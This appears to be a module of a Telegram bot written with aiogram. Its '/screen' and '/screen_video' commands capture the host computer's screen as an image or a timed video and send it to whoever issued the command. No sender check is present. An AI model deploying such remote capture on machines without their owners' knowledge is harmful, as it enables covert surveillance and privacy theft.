from start_bot import dp, logger
from aiogram.filters import Command
from aiogram.types import Message, FSInputFile, BufferedInputFile
from aiogram.enums import ChatAction
import pyautogui
from start_bot import bot
import io
from datetime import datetime
import numpy as np
import cv2


@dp.message(Command("screen"))
async def make_screen(message: Message):
	try:
		try:
			await bot.send_message(message.chat.id, "Спроба зробити скріншот")
			screen = pyautogui.screenshot()
			with io.BytesIO() as buffer:
				screen.save(buffer, format="PNG")
				buffer.seek(0)
				await bot.send_chat_action(message.chat.id, ChatAction.UPLOAD_PHOTO)
				await bot.send_photo(message.chat.id, BufferedInputFile(buffer.getvalue(), filename="screenshot.png"))
		except Exception as e:
			try:
				await bot.send_message(message.chat.id, "Помилка")
				await bot.send_message(message.chat.id, str(e))
			except Exception as e:
				logger.error(f"Error in make_screen>Error Notification: {str(e)}")

	except Exception as e:
		try:
			logger.critical(f"GLOBAL ERROR im make_screen function: {str(e)}")
		except:
			pass



@dp.message(Command("screen_video"))
async def make_screen_video(message: Message):
	try:
		try:
			seconds = int(message.text.replace("/screen_video ", ""))
			SCREEN_SIZE = tuple(pyautogui.size())
			fourcc = cv2.VideoWriter_fourcc(*"XVID")
			out = cv2.VideoWriter("bWife/temp/record.avi", fourcc, 15, (SCREEN_SIZE))
			current_time = datetime.now()
			while (datetime.now() - current_time).seconds < seconds:
				img = pyautogui.screenshot()
				frame = np.array(img)
				frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
				out.write(frame)
			out.release()
			await bot.send_chat_action(message.chat.id, ChatAction.UPLOAD_VIDEO)
			await bot.send_document(message.chat.id, FSInputFile("bWife/temp/record.avi", filename="record.avi"))

		except Exception as e:
			try:
				await bot.send_message(message.chat.id, "Помилка запису")
				await bot.send_message(message.chat.id, str(e))
			except Exception as e:
				logger.error(f"Error in make_screen_video>Error Notification: {str(e)}")

	except Exception as e:
		try:
			logger.critical(f"GLOBAL ERROR im make_screen_video function: {str(e)}")
		except:
			pass